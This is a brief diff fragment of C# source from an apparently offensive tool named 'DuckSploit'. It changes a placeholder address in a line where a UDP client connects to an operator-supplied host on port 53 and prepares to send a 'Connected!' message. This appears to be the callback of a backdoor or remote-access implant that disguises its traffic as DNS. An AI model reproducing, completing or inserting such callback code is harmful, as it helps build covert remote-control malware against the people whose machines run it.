@@ -253,7 +253,7 @@ namespace DuckSploit
 
 			try{
 				tempdir = Path.GetTempPath(); 
-				udpClient.Connect("<ip>", 53);
+				udpClient.Connect("<yourip>", 53);
 
 				Byte[] sendBytes = Encoding.ASCII.GetBytes("Connected!");
 
